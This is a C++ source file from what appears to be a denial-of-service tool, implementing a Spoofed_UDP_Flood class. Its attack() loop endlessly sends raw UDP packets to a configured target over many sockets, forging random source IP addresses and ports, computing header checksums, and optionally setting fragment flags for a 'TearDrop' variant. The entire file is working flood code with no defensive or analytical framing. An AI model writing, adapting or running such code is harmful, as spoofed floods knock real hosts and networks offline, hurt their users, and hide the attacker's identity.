#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "../Headers/Randomizer.hpp"
#include "../Headers/Spoofed_UDP_Flood.hpp"
#include "../Headers/Logging.hpp"

void Spoofed_UDP_Flood::attack() {
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    char buf[8192], *pseudogram;
    struct pseudo_header psh{};
    auto *ip = (struct iphdr *) buf;
    auto *udp = (struct udphdr *) (buf + sizeof (struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    while (true){
        for(int x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_UDP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    print_error("Can't resolve the host");
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if(conf->RandomizeSource){
                std::string ipaddr{};
                Randomizer::randomIP(ipaddr);
                if((ip->saddr = inet_addr(ipaddr.c_str())) == -1){
                    continue;
                }
            }else{
                ip->saddr = 0;
            }

            init_headers(ip, udp, buf);
            override_headers(udp, ip);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            psh.source_address = ip->saddr;
            psh.dest_address = ip->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_UDP;
            psh.length = htons(sizeof(struct udphdr) + strlen(buf));

            int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(buf);
            pseudogram = (char *) ::operator new(static_cast<size_t>(psize));

            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , udp , sizeof(struct udphdr) + strlen(buf));

            udp->uh_sum = csum( (unsigned short*) pseudogram , psize);


            if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, reinterpret_cast<sockaddr*>(&dst), sizeof(struct sockaddr_in)))) == -1) {
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_UDP);
            }else{
                (*conf->req)++;
            }
            delete pseudogram;
        }
        (*conf->voly)++;
        pause();
    }
}

Spoofed_UDP_Flood::Spoofed_UDP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(conf)) {

}

void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
    switch(conf->vector){
        case Config::TearDrop:
            ip->frag_off |= htons(0x2000);
            break;
        default:break;
    }
}

void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
    auto s_port = conf->RandomizePort ? Randomizer::randomPort() : 0;
    // IP Struct
    ip->ihl = sizeof(struct iphdr)/4;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(buf);
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = csum((unsigned short *) buf, ip->tot_len);

    // UDP Struct
    udp->uh_sport = htons(static_cast<uint16_t>(s_port));
    udp->uh_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
    udp->uh_ulen = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
}